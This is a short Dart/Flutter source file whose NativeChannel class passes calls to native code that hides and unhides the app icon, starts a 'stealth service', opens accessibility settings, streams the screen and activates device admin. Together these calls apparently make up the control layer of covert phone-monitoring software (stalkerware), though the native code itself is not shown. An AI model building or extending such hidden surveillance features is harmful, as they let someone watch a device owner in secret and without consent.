import 'package:flutter/services.dart';

class NativeChannel {
  static const MethodChannel _channel = MethodChannel('com.surokkhanet/native');

  static Future<void> hideAppIcon() async {
    try {
      await _channel.invokeMethod('hideAppIcon');
    } on PlatformException catch (e) {
      print("Failed to hide app icon: ${e.message}");
    }
  }

  static Future<void> startStealthService() async {
    try {
      await _channel.invokeMethod('startStealthService');
    } on PlatformException catch (e) {
      print("Failed to start stealth service: ${e.message}");
    }
  }

  static Future<void> openAccessibilitySettings() async {
    try {
      await _channel.invokeMethod('openAccessibilitySettings');
    } on PlatformException catch (e) {
      print("Failed to open accessibility settings: ${e.message}");
    }
  }

  static Future<void> startScreenStream() async {
    try {
      await _channel.invokeMethod('startScreenStream');
    } on PlatformException catch (e) {
      print("Failed to start screen stream: ${e.message}");
    }
  }
  
  static Future<void> activateDeviceAdmin() async {
    try {
      await _channel.invokeMethod('activateDeviceAdmin');
    } on PlatformException catch (e) {
      print("Failed to activate device admin: ${e.message}");
    }
  }
  
  static Future<void> unhideAppIcon() async {
    try {
      await _channel.invokeMethod('unhideAppIcon');
    } on PlatformException catch (e) {
      print("Failed to unhide app icon: ${e.message}");
    }
  }
}